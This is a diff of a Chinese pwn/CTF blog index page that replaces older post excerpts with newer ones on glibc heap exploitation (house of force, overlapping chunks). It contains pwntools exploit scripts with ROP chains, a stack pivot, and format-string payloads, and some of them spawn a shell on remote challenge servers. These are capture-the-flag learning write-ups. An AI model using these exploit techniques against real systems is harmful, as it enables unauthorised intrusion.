@@ -115,74 +115,93 @@
     
     <div class="recent-post-item">
 
-      <a href="/2024/09/18/%E8%A7%A3%E5%86%B3libc6%E8%BD%AF%E4%BB%B6%E5%8C%85%E5%92%8Clibc6-dev%E4%B8%8D%E5%8C%B9%E9%85%8D%E7%9A%84%E9%97%AE%E9%A2%98/" class="item-title">解决libc6软件包和libc6-dev不匹配的问题</a>
+      <a href="/2024/11/03/house-of-force/" class="item-title">200~house_of_force</a>
       
-      <time datetime="2024-09-18T12:27:44.000Z">
-        2024-09-18
+      <time datetime="2024-11-03T10:14:32.000Z">
+        2024-11-03
       </time>
       
       <!-- <div class="article-digest"> -->
-        <!-- 之前在学vm内核调试的时候，不小心把libc6-dev之类的包给删掉了，导致后面gcc编译不了，重新下载libc6-dev时，会弹出这样的报错，这种报错之前很常见。
-下列软件包有未满足的依赖关系：
- libc6-dev : 依赖: libc6 (= 2.27-3ubuntu1.6) 但是 2.35-0ubuntu3 正要被安装
-             依赖: libc-dev-bin (= 2.27-3ubuntu1.6)
-E: 无法修正错误，因为您要求某些软件包保持现状，就是它们破坏了软件包间的依赖关系。
-
-最本质的原因就是已安装的libc6版本是2.35-0ubuntu3，但是要安装的libc6-dev所要的依赖是libc6和libc-dev-bin的版本都是2.27,当初想过把libc6降级的，因为libc6是软件包，有很多依赖关系，结果系统奔溃了，还刚好没提前拍快照，只有很久之前的。
-libc6就是一个软件包名称，包含c标准库的所有功能，包含有很多库文件，如libc.so.6，是底层代码如prinf函数的实现。通常存放在/lib目录下，系统核心库的存放目录。
-libc6-de -->
+        <!-- 利用条件：能控制topchunk_size，能够自由控制申请的堆块大小。需要知道top_chunk地址与目的地址的偏移量，如果还不对齐，即结果不是0x0结尾，需要多减8，然后减去SIZE_SZ（8）
+结果：能将topcunk的地址控制到我们想要的地址，再申请内存就可以控制这个地址的值。
+check1对topchunk_size的检查，(unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)
+// 获取当前的top chunk，并计算其对应的大小
+victim = av-&gt;top;
+size   = chunksize(victim);
+// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。
+if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) 
+&#123;
+    remainder_size = size - nb;
+    remainder      = chunk_at_offset(victim, n -->
         <!-- </div> -->
 
         
-        <p>之前在学vm内核调试的时候，不小心把libc6-dev之类的包给删掉了，导致后面gcc编译不了，重新下载libc6-dev时，会弹出这样的报错，这种报错之前很常见。</p>
-<pre><code class="lang-python">下列软件包有未满足的依赖关系：
- libc6-dev : 依赖: libc6 (= 2.27-3ubuntu1.6) 但是 2.35-0ubuntu3 正要被安装
-             依赖: libc-dev-bin (= 2.27-3ubuntu1.6)
-E: 无法修正错误，因为您要求某些软件包保持现状，就是它们破坏了软件包间的依赖关系。
-</code></pre>
-<p>最本质的原因就是已安装的libc6版本是2.35-0ubuntu3，但是要安装的libc6-dev所要的依赖是libc6和libc-dev-bin的版本都是2.27,当初想过把libc6降级的，因为libc6是软件包，有很多依赖关系，结果系统奔溃了，还刚好没提前拍快照，只有很久之前的。</p>
-<p>libc6就是一个软件包名称，包含c标准库的所有功能，包含有很多库文件，如libc.so.6，是底层代码如prinf函数的实现。通常存放在/lib目录下，系统核心库的存放目录。</p>
-<p>libc6-dev含有很多c标准库，如stdio.h,math.h.包含很多头文件。解压放到/usr/include/。</p>
-<p>/usr/lib 目录是用户级库的存放目录，这些库文件是用户安装的软件包所需的，例如图形库、数据库库、开发库等。这些库文件通常是用户安装的软件包所需的，而不是系统核心组件所需的。</p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918204615913.png" alt="image-20240918204615913"></p>
-<p>最正确的办法就是下载对应版本的libc6-dev.deb解压，要和已安装的libc6版本匹配，当时是直接找了网站<a target="_blank" rel="noopener" href="http://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc/">glibc库</a> 下载libc6-dev.deb，但是找不到2.35版本的，后面终于在package.ubuntu.com找到,点这两个下载</p>
-<pre><code class="lang-py">https://packages.ubuntu.com/jammy/libc6-dev
-</code></pre>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918210634377.png" alt="image-20240918210634377"></p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918210702629.png" alt="image-20240918210702629"></p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918210853312.png" alt="image-20240918210853312"></p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918211010603.png" alt="image-20240918211010603"></p>
-<p>解压到/tmp/libc6-dev</p>
-<pre><code class="lang-py">mkdir /tmp/libc6-dev
-dpkg-deb -x libc6-dev_2.35-0ubuntu3.8_amd64.deb /tmp/libc6-dev
-sudo rsync -av /tmp/libc6-dev/usr/include/ /usr/include/         #移动头文件
-sudo rsync -av /tmp/libc6-dev/usr/share/ /usr/share/             #移动共享数据文件
+        <p>利用条件：能控制topchunk_size，能够自由控制申请的堆块大小。需要知道top_chunk地址与目的地址的偏移量，如果还不对齐，即结果不是0x0结尾，需要多减8，然后减去SIZE_SZ（8）</p>
+<p>结果：能将topcunk的地址控制到我们想要的地址，再申请内存就可以控制这个地址的值。</p>
+<h4 id="check1"><a href="#check1" class="headerlink" title="check1"></a>check1</h4><p>对topchunk_size的检查，(unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)</p>
+<pre><code class="lang-c++">// 获取当前的top chunk，并计算其对应的大小
+victim = av-&gt;top;
+size   = chunksize(victim);
+// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。
+if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) 
+&#123;
+    remainder_size = size - nb;
+    remainder      = chunk_at_offset(victim, nb);
+    av-&gt;top        = remainder;
+    #设置top_chunk的头，附近值会有所变化
+    set_head(victim, nb | PREV_INUSE |
+            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
+    set_head(remainder, remainder_size | PREV_INUSE);
 
-sudo rsync -av /tmp/libc6-dev/usr/lib/ /usr/lib/                 #移动用户级库文件，这里有一个小点。
+    check_malloced_chunk(av, victim, nb);
+    void *p = chunk2mem(victim);
+    alloc_perturb(p, bytes);
+    return p;
+&#125;
 </code></pre>
-<p>同理，libc-dev-bin也解压</p>
-<pre><code class="lang-py">mkdir /tmp/libc-dev-bin
-dpkg-deb -x libc-dev-bin_2.35-0ubuntu3.8_amd64.deb /tmp/libc-dev-bin
-sudo rsync -av /tmp/libc-dev-bin/usr/ /usr/                      #主要是一些工具脚本
+<p>所以把size改为-1，在补码中为很大的数，能够满足条件</p>
+<h5 id="新的remainder即top-chunk的地址-remainder-chunk-at-offset-victim-nb-，需要算出topchunk的地址和目标地址的偏移"><a href="#新的remainder即top-chunk的地址-remainder-chunk-at-offset-victim-nb-，需要算出topchunk的地址和目标地址的偏移" class="headerlink" title="新的remainder即top_chunk的地址  **remainder = chunk_at_offset(victim, nb);**，需要算出topchunk的地址和目标地址的偏移"></a>新的remainder即top_chunk的地址  <code>**remainder = chunk_at_offset(victim, nb);**</code>，需要算出topchunk的地址和目标地址的偏移</h5><h4 id="check2"><a href="#check2" class="headerlink" title="check2"></a>check2</h4><p>对申请的size的检查</p>
+<pre><code class="lang-c++">/*
+   Check if a request is so large that it would wrap around zero when
+   padded and aligned. To simplify some other code, the bound is made
+   low enough so that adding MINSIZE will also not wrap around zero.
+ */
+
+#这里的req即是nb.对req的大小的检查，((unsigned long) (req)要小于 (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))
+
+#define REQUEST_OUT_OF_RANGE(req)                                              \
+    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))
+/* pad request bytes into a usable size -- internal version */
+//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1
+
+# 对nb加 SIZE_SZ加 MALLOC_ALIGN_MASK,最后和MALLOC_ALIGN_MASK按位与对齐,这里的SIZE_SZ是8
+#define request2size(req)                                                      \
+    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \
+         ? MINSIZE                                                             \
+         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)
+
+/*  Same, except also perform argument check */
+# req不能大于 -2 * MINSIZE，否则会报错
+#define checked_request2size(req, sz)                                          \
+    if (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \
+        __set_errno(ENOMEM);                                                   \
+        return 0;                                                              \
+    &#125;                                                                          \
+    (sz) = request2size(req);
 </code></pre>
-<p>后面把tmp目录下的这两个临时文件删了就好。</p>
-<p>后面我试着gcc编译的时候，还是遇见了个老错误</p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918211756419.png" alt="image-20240918211756419"></p>
-<pre><code class="lang-py">gcc 1.c -o 1
-/usr/bin/ld: 找不到 Scrt1.o: 没有那个文件或目录
-/usr/bin/ld: 找不到 crti.o: 没有那个文件或目录
-collect2: error: ld returned 1 exit status
-</code></pre>
-<p>通过查找发现，它在/tmp/libc6-dev/usr/lib/x86_64-linux-gnu 这个目录里，这个正是库文件的位置，把这些库文件移动到/usr/lib/x86_64-linux-gnu/目录就好</p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918211910349.png" alt="image-20240918211910349"></p>
-<p>最后，编译成功</p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918212931846.png" alt="image-20240918212931846"></p>
+<h5 id="首先-unsigned-long-req-lt-unsigned-long-INTERNAL-SIZE-T-2-MINSIZE-，即无符号的nb要小于无符号的-2-MINSIZE，即req不能大于-2MINSIZE-，一般都能满足条件。"><a href="#首先-unsigned-long-req-lt-unsigned-long-INTERNAL-SIZE-T-2-MINSIZE-，即无符号的nb要小于无符号的-2-MINSIZE，即req不能大于-2MINSIZE-，一般都能满足条件。" class="headerlink" title="首先  ((unsigned long) (req) &lt;= (unsigned long) (INTERNAL_SIZE_T)(-2  MINSIZE))，即无符号的nb要小于无符号的  **-2  MINSIZE，即req不能大于-2MINSIZE*，一般都能满足条件。"></a>首先  ((unsigned long) (req) &lt;= (unsigned long) (INTERNAL_SIZE_T)(-2 <em> MINSIZE))，即无符号的nb要小于无符号的  **-2 </em> MINSIZE<strong>，即req不能大于</strong>-2<em>MINSIZE*</em>，一般都能满足条件。</h5><h5 id="其次是对req的对齐的检查，req需要是0x0结尾来对齐，否则得多减8"><a href="#其次是对req的对齐的检查，req需要是0x0结尾来对齐，否则得多减8" class="headerlink" title="其次是对req的对齐的检查，req需要是0x0结尾来对齐，否则得多减8"></a>其次是对req的对齐的检查，req需要是0x0结尾来对齐，否则得多减8</h5><h5 id="req-SIZE-SZ-MALLOC-ALIGN-MASK-amp-MALLOC-ALIGN-MASK-，这里的结果是最后申请的大小。由于-req-SIZE-SZ，SIZE-SZ是8，所以算出偏移后还需要减去8，虽然req会加上MALLOC-ALIGN-MASK，但是最后会被对齐掉，就不用多减掉MALLOC-ALIGN-MASK了"><a href="#req-SIZE-SZ-MALLOC-ALIGN-MASK-amp-MALLOC-ALIGN-MASK-，这里的结果是最后申请的大小。由于-req-SIZE-SZ，SIZE-SZ是8，所以算出偏移后还需要减去8，虽然req会加上MALLOC-ALIGN-MASK，但是最后会被对齐掉，就不用多减掉MALLOC-ALIGN-MASK了" class="headerlink" title="((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)，这里的结果是最后申请的大小。由于(req) + SIZE_SZ，SIZE_SZ是8，所以算出偏移后还需要减去8，虽然req会加上MALLOC_ALIGN_MASK，但是最后会被对齐掉，就不用多减掉MALLOC_ALIGN_MASK了"></a>((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)，这里的结果是最后申请的大小。由于(req) + SIZE_SZ，SIZE_SZ是8，所以算出偏移后还需要减去8，虽然req会加上MALLOC_ALIGN_MASK，但是最后会被对齐掉，就不用多减掉MALLOC_ALIGN_MASK了</h5><p><code>MALLOC_ALIGN</code> 通常指的是内存块对齐的要求。如果req不对齐，不是0x0结尾的，需要多减掉8</p>
+<h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a>bcloud_bctf_2016</h2><p>只开了栈上的保护</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241104192949440.png" alt="image-20241104192949440"></p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241104193057354.png" alt="image-20241104193057354"></p>
+<p>这里会把堆的地址给到v2的指针，后续会打印出来</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241104193219359.png" alt="image-20241104193219359"></p>
+<p>🐕Ⅷ题目，调试的时候完全不是题目逻辑，算了。</p>
 
         
 
 
         <span>
-          <a class="article-read" href="/2024/09/18/解决libc6软件包和libc6-dev不匹配的问题/"> Read more -->
+          <a class="article-read" href="/2024/11/03/house-of-force/"> Read more -->
           </span>
         </div>
 
@@ -190,141 +209,62 @@ collect2: error: ld returned 1 exit status
     
     <div class="recent-post-item">
 
-      <a href="/2024/09/13/glibc/" class="item-title">glibc</a>
+      <a href="/2024/10/29/pwn2%20short/" class="item-title"></a>
       
-      <time datetime="2024-09-13T09:02:48.000Z">
-        2024-09-13
+      <time datetime="2024-10-29T09:09:11.391Z">
+        2024-10-29
       </time>
       
       <!-- <div class="article-digest"> -->
-        <!-- 手动下载glibc版本 有时候做题会遇到glibc-all-in-one里没有的glibc,需要自己下
-可以到网站手动下载对应的./deb文件
-http://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc/
+        <!-- pwn2 short很简单的32位栈迁移，还留了个后门
+这里获得栈地址
 
-在glibc-all-in-one目录下，若glibc版本名为x,用指令解压
-./extract ./x.deb ./libs/x
-
-
- -->
-        <!-- </div> -->
-
-        
-        <h3 id="手动下载glibc版本"><a href="#手动下载glibc版本" class="headerlink" title="手动下载glibc版本"></a>手动下载glibc版本</h3><p> 有时候做题会遇到glibc-all-in-one里没有的glibc,需要自己下</p>
-<p>可以到网站手动下载对应的./deb文件</p>
-<pre><code class="lang-py">http://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc/
-</code></pre>
-<p>在glibc-all-in-one目录下，若glibc版本名为x,用指令解压</p>
-<pre><code class="lang-py">./extract ./x.deb ./libs/x
-</code></pre>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240913170944068.png" alt="image-20240913170944068"></p>
-
-        
-
-
-        <span>
-          <a class="article-read" href="/2024/09/13/glibc/"> Read more -->
-          </span>
-        </div>
-
-        
-    
-    <div class="recent-post-item">
-
-      <a href="/2024/09/12/gostack/" class="item-title">gostack</a>
-      
-      <time datetime="2024-09-12T11:31:39.000Z">
-        2024-09-12
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!-- i 一个用go语言写的程序。
- alt+f7用go_parser修复一下
-
-主要的函数，只有一个输入点，因为是go语言写的，其反汇编也是很难看懂
-
-主要看汇编,它后面会将输入的字符串复制到栈上
-
-在scanner输入这里会检查这个位置的值是否为0
-为了方便全都用0填充
-脚本的具体调试是报错的，看不了，也只能分析个大概。
-
-
-直接gdb
-
-
-算出距离rbp是0x1c8的距离。
-这种题一般是用ret2syscall。而往年的国赛题也是ret2syscall居多。
-找到的gadget
-
-syscall;ret是很难找到的。通过gadget找不到。
-
-先sys_read在bss段输入bin/sh,再sys_execve.
-#bss read
-payload=b&#39;\x00&#39;*0x1d0+p64(pop_rdi_r14)+p64(0)*6
-payload+=p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(8)+p64(pop_rax)+p64(0)+p64(syscall_ret)
-
-#execve
-payload+=p64(pop_rdi_r14)+ -->
-        <!-- </div> -->
-
-        
-        <p>i 一个用go语言写的程序。</p>
-<p> alt+f7用go_parser修复一下</p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240912193439984.png" alt="image-20240912193439984"></p>
-<p>主要的函数，只有一个输入点，因为是go语言写的，其反汇编也是很难看懂</p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240912193707048.png" alt="image-20240912193707048"></p>
-<p>主要看汇编,它后面会将输入的字符串复制到栈上</p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240912194553878.png" alt="image-20240912194553878"></p>
-<p>在scanner输入这里会检查这个位置的值是否为0</p>
-<p>为了方便全都用0填充</p>
-<p>脚本的具体调试是报错的，看不了，也只能分析个大概。</p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240913195104594.png" alt="image-20240913195104594"></p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240913195003832.png" alt="image-20240913195003832"></p>
-<p>直接gdb</p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240912194856414.png" alt="image-20240912194856414"></p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240912194938053.png" alt="image-20240912194938053"></p>
-<p>算出距离rbp是0x1c8的距离。</p>
-<p>这种题一般是用ret2syscall。而往年的国赛题也是ret2syscall居多。</p>
-<p>找到的gadget</p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240912195323699.png" alt="image-20240912195323699"></p>
-<p>syscall;ret是很难找到的。通过gadget找不到。</p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240913194222552.png" alt="image-20240913194222552"></p>
-<p>先sys_read在bss段输入bin/sh,再sys_execve.</p>
-<pre><code class="lang-py">#bss read
-payload=b&#39;\x00&#39;*0x1d0+p64(pop_rdi_r14)+p64(0)*6
-payload+=p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(8)+p64(pop_rax)+p64(0)+p64(syscall_ret)
-</code></pre>
-<pre><code class="lang-py">#execve
-payload+=p64(pop_rdi_r14)+p64(bss)+p64(0)*5+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(pop_rax)+p64(0x3b)+p64(syscall_ret)
-</code></pre>
-<h5 id="同时也顺带复习一下，sys-read的各个寄存器的值，rax-0-rdi-0-rsi-bss-rdx-size"><a href="#同时也顺带复习一下，sys-read的各个寄存器的值，rax-0-rdi-0-rsi-bss-rdx-size" class="headerlink" title="同时也顺带复习一下，sys_read的各个寄存器的值，rax=0,rdi=0,rsi=bss,rdx=size."></a>同时也顺带复习一下，sys_read的各个寄存器的值，rax=0,rdi=0,rsi=bss,rdx=size.</h5><h5 id="sys-execve-rax-0x3b-rdi-bin-sh-addr-rsi-0-rdx-0"><a href="#sys-execve-rax-0x3b-rdi-bin-sh-addr-rsi-0-rdx-0" class="headerlink" title="sys_execve,rax=0x3b,rdi=bin/sh_addr,rsi=0,rdx=0."></a>sys_execve,rax=0x3b,rdi=bin/sh_addr,rsi=0,rdx=0.</h5><h5 id="前面按照脚本一样写一直跑不通，后面突然就跑通了，也是有点离谱。"><a href="#前面按照脚本一样写一直跑不通，后面突然就跑通了，也是有点离谱。" class="headerlink" title="前面按照脚本一样写一直跑不通，后面突然就跑通了，也是有点离谱。"></a>前面按照脚本一样写一直跑不通，后面突然就跑通了，也是有点离谱。</h5><pre><code class="lang-py">from pwn import*
+把bin/sh的地址放返回地址后面就ok
+from pwn import*
 from LibcSearcher import *
-p=remote(&quot;pwn.challenge.ctf.show&quot;,28159)
-#p=process(&quot;./gostack&quot;)
+p=remote(&quot;0192d5ebf7187dfe967b1c88a2bb1480.3sya.dg02.ciihw.cn&quot;,43744)
+#p=process(&quot;./short&quot;)
 context.log_level=&quot;debug&quot;
-context(arch=&#39;amd64&#39;,os=&#39;linux&#39;)
-#payload=b&#39;a&#39;*0x1d0+p64(0x4A0af6)
 
-pop_rdi_r14=0x4a18a5
-pop_rax=0x40f984
-bss=0x5655C2
-pop_rsi=0x42138a
-pop_rdx=0x4944ec
-syscall_ret=0x4616C9
+p.sendlineafter(&#39;username: &#39;,&#39;admin&#39;)
+p.sendlineafter(&#39;password: &#39;,&#39;admin123&#39;)
+p.recvuntil(&#39;0x&#39;)
+stack=int(p.recv(8),16)
+print(hex(stack))
+pop_edi=0x0804884a
+pop_ebx=0x08048411
+gift=0x080485E6
+leave=0x08048674 -->
+        <!-- </div> -->
+
+        
+        <h1 id="pwn2-short"><a href="#pwn2-short" class="headerlink" title="pwn2 short"></a>pwn2 short</h1><p>很简单的32位栈迁移，还留了个后门</p>
+<p>这里获得栈地址</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241029170723988.png" alt="image-20241029170723988"></p>
+<p>把bin/sh的地址放返回地址后面就ok</p>
+<pre><code class="lang-py">from pwn import*
+from LibcSearcher import *
+p=remote(&quot;0192d5ebf7187dfe967b1c88a2bb1480.3sya.dg02.ciihw.cn&quot;,43744)
+#p=process(&quot;./short&quot;)
+context.log_level=&quot;debug&quot;
+
+p.sendlineafter(&#39;username: &#39;,&#39;admin&#39;)
+p.sendlineafter(&#39;password: &#39;,&#39;admin123&#39;)
+p.recvuntil(&#39;0x&#39;)
+stack=int(p.recv(8),16)
+print(hex(stack))
+pop_edi=0x0804884a
+pop_ebx=0x08048411
+gift=0x080485E6
+leave=0x08048674
+binsh=0x0804A038 
+payload=p32(gift)+p32(0)+p32(binsh)+b&#39;a&#39;*68+p32(stack-4)+p32(leave)
 
 
 #gdb.attach(p)
-#pause()
-#bss read
-payload=b&#39;\x00&#39;*0x1d0+p64(pop_rdi_r14)+p64(0)*6
-payload+=p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(8)+p64(pop_rax)+p64(0)+p64(syscall_ret)
+sleep(1)
+p.sendlineafter(&quot;msg:&quot;,payload)
 
-#exceve
-payload+=p64(pop_rdi_r14)+p64(bss)+p64(0)*5+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(pop_rax)+p64(0x3b)+p64(syscall_ret)
-#p.recv()
-p.sendlineafter(&#39;magic message :&#39;,payload)
-
-p.sendline(b&#39;/bin/sh\x00&#39;)
 p.interactive()
 </code></pre>
 
@@ -332,7 +272,7 @@ p.interactive()
 
 
         <span>
-          <a class="article-read" href="/2024/09/12/gostack/"> Read more -->
+          <a class="article-read" href="/2024/10/29/pwn2 short/"> Read more -->
           </span>
         </div>
 
@@ -340,10 +280,69 @@ p.interactive()
     
     <div class="recent-post-item">
 
-      <a href="/2024/09/08/pstack/" class="item-title">pstack</a>
+      <a href="/2024/10/21/overlapping_chunks/" class="item-title">overlapping_chunks</a>
       
-      <time datetime="2024-09-08T08:40:58.000Z">
-        2024-09-08
+      <time datetime="2024-10-21T12:11:58.000Z">
+        2024-10-21
+      </time>
+      
+      <!-- <div class="article-digest"> -->
+        <!-- 大多都是堆溢出的情况下，chunk释放前或释放后改变size的值，再申请的时候造成两个堆块有重合的地方，有时候需要改变对应下一个堆的pre_size绕过检查，虽说在libc2.29以后才出现，但有时候2.23的版本还是会因此而报错。所以尽可能的在下一个chunk的pre_size位改成我们的size.
+/* consolidate backward */
+    if (!prev_inuse(p)) &#123;
+      prevsize = prev_size (p);
+      size += prevsize;
+      p = chunk_at_offset(p, -((long) prevsize));
+      /* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */
+      if (__glibc_unlikely (chunksize(p) != prevsize))
+        malloc_printerr (&quot;corrupted size vs. prev_size while conso -->
+        <!-- </div> -->
+
+        
+        <p>大多都是堆溢出的情况下，chunk释放前或释放后改变size的值，再申请的时候造成两个堆块有重合的地方，有时候需要改变对应下一个堆的pre_size绕过检查，虽说在libc2.29以后才出现，但有时候2.23的版本还是会因此而报错。所以尽可能的在下一个chunk的pre_size位改成我们的size.</p>
+<pre><code class="lang-c++">/* consolidate backward */
+    if (!prev_inuse(p)) &#123;
+      prevsize = prev_size (p);
+      size += prevsize;
+      p = chunk_at_offset(p, -((long) prevsize));
+      /* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */
+      if (__glibc_unlikely (chunksize(p) != prevsize))
+        malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);
+      unlink_chunk (av, p);
+    &#125;
+</code></pre>
+<h2 id="2015-hacklu-bookstore"><a href="#2015-hacklu-bookstore" class="headerlink" title="2015 hacklu bookstore"></a>2015 hacklu bookstore</h2><p>该程序是动态链接的 64 位程序，主要开启了 Canary 与 NX 保护.</p>
+<p>程序的最后有个格式化字符串漏洞，只能用一次，用于泄露libc和在fini的地方写上main函数地址</p>
+<p>这里输入s是能写上栈的地方，这里输入fini的地址</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241021202201568.png" alt="image-20241021202201568"></p>
+<p>算出偏移是13</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241021210331631.png" alt="image-20241021210331631"></p>
+<p>这里只强调构造的fake_chunk</p>
+<pre><code class="lang-py">payload=b&#39;%2828c%13$hnkk%31$p&#39;
+payload=payload.ljust(0x88,b&#39;b&#39;)
+payload+=p64(0x151)
+payload=payload.ljust(0x1d0,b&#39;\x41&#39;)+p64(0x150)+p64(0x41)+p64(0)*6+p64(0x40)+p64(0x31)
+</code></pre>
+<p>申请堆的过程中有堆溢出可以更改下一个 堆的size，改成下面特殊的堆的size，根据题目给大小改。</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241021220811817.png" alt="image-20241021220811817"></p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241021220706913.png" alt="image-20241021220706913"></p>
+
+        
+
+
+        <span>
+          <a class="article-read" href="/2024/10/21/overlapping_chunks/"> Read more -->
+          </span>
+        </div>
+
+        
+    
+    <div class="recent-post-item">
+
+      <a href="/2024/10/17/heapcreator/" class="item-title">heapcreator</a>
+      
+      <time datetime="2024-10-17T08:03:43.000Z">
+        2024-10-17
       </time>
       
       <!-- <div class="article-digest"> -->
@@ -356,7 +355,7 @@ p.interactive()
 
 
         <span>
-          <a class="article-read" href="/2024/09/08/pstack/"> Read more -->
+          <a class="article-read" href="/2024/10/17/heapcreator/"> Read more -->
           </span>
         </div>
 
@@ -364,92 +363,104 @@ p.interactive()
     
     <div class="recent-post-item">
 
-      <a href="/2024/07/27/%E6%AD%A6%E5%8A%9F%E8%AE%BA%E5%89%91/" class="item-title">武功论剑</a>
+      <a href="/2024/09/21/stdout/" class="item-title">stdout</a>
       
-      <time datetime="2024-07-27T05:23:02.000Z">
-        2024-07-27
+      <time datetime="2024-09-21T14:44:34.000Z">
+        2024-09-21
       </time>
       
       <!-- <div class="article-digest"> -->
-        <!-- 一道很简单的apk题，反汇编出来，将两个数组的值一一异或就得到flag
+        <!-- 这里stdout第三个参数是0，就是标准输出全缓冲，缓冲区被填满才能进行回显
+刷新缓冲区有几种办法
 
-这道简单的栈溢出题，开了canary保护
-这里输入0x49个字节可以将canary和rbp打印出来
+能够溢出8字节
 
-主函数有个栈溢出漏洞，这里ret2libc泄露puts的got表地址，再返回重新输入一次
+一个没什么用的函数
 
+那么只能将缓冲区填满，刚开始想的是用vuln函数不断输入
+
+ret的操作是pop rip，rsp=rsp+8, 指向0x0x7fff153a5588.  endbr64指令rsp是不动的，push rbp后rbp变成了原来返回地址的位置,再次调用相同的输入也只是让rbp+8,即每次
+for i in range(20):
+    payload=b&#39;c&#39;*0x28+p64(vul)
+    p.send(payload)
+    print(i)
+
+也只是让rbp+8移动
+
+第二次的rbp
+
+只是调用vuln的话时不会回显的。
+
+其实不是理想当然的填充，得调用extend函数填充缓冲区。那么就只能不断调用extend函数把缓冲区填满。
+调用extend时第二十次时的栈
+
+exp
 from pwn import*
 from LibcSearcher import *
-#p=remote(&quot;59.62.61.30&quot;,46489)
-p=process(&quot;./pwn&quot;)
-context.log_level=&quot;debug&quot;
-libc=ELF(&#39;./libc-2.27.so&#39;)
-
-pop_rdi=0x400853
-puts_got=0x601018
-call_puts=0x4007af
-payload=b&#39;a&#39;*0x48+b&#39;b&#39;
-puts_plt=0x400580
-
-#pause()
-p.send(payload)
-p.recvuntil(&#39;b&#39;)
-
-canary=u64(p.recv -->
+#p=remote(&quot;node4.buuoj.cn&qu -->
         <!-- </div> -->
 
         
-        <p>一道很简单的apk题，反汇编出来，将两个数组的值一一异或就得到flag</p>
-<p><img src="https://s2.loli.net/2024/07/27/dlFW9we6XxpRzNV.png" alt="image-20240727135021283"></p>
-<p>这道简单的栈溢出题，开了canary保护</p>
-<p>这里输入0x49个字节可以将canary和rbp打印出来</p>
-<p><img src="https://s2.loli.net/2024/07/27/37YWbzvPcIiJ1H2.png" alt="image-20240727141257896"></p>
-<p>主函数有个栈溢出漏洞，这里ret2libc泄露puts的got表地址，再返回重新输入一次</p>
-<p><img src="https://s2.loli.net/2024/07/27/LGPVpf3ImUwqYdZ.png" alt="image-20240727141435162"></p>
+        <p>这里stdout第三个参数是0，就是标准输出全缓冲，缓冲区被填满才能进行回显</p>
+<p>刷新缓冲区有几种办法</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922190505843.png" alt="image-20240922190505843"></p>
+<p>能够溢出8字节</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922190659808.png" alt="image-20240922190659808"></p>
+<p>一个没什么用的函数</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922190726730.png" alt="image-20240922190726730"></p>
+<p>那么只能将缓冲区填满，刚开始想的是用vuln函数不断输入</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922202629304.png" alt="image-20240922202629304"></p>
